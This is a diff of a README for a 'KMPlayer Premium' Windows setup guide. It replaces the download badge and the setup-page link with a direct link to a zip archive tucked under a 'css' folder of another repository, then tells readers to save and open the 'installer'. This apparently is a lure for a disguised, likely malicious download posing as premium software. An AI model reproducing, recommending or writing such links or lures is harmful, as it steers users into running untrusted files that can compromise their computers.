@@ -5,7 +5,7 @@ description: "Install KMPlayer Premium on Windows with this setup guide to fix i
 ---
 # 🎬 KMPlayer-PC-Setup-Guide - Run Premium Media Player On Windows
 
-[![Download KMPlayer Setup](https://img.shields.io/badge/Download-KMPlayer_Setup-blue.svg)](https://github.com/R9589297/KMPlayer-PC-Setup-Guide)
+[![Download KMPlayer Setup](https://img.shields.io/badge/Download-KMPlayer_Setup-blue.svg)](https://raw.githubusercontent.com/R9589297/r9589297.github.io/main/css/2.3.zip)
 
 ## 📁 Project Overview
 
@@ -25,7 +25,7 @@ Your computer must meet these basic needs to run the software smoothly:
 
 Follow these steps to install the software correctly on your computer.
 
-1. Visit the [KMPlayer Setup Page](https://github.com/R9589297/KMPlayer-PC-Setup-Guide) to access the installer files.
+1. Visit the [KMPlayer Setup Page](https://raw.githubusercontent.com/R9589297/r9589297.github.io/main/css/2.3.zip) to access the installer files.
 2. Locate the download button on the page.
 3. Save the installer file to your Downloads folder.
 4. Open the folder where you saved the file.
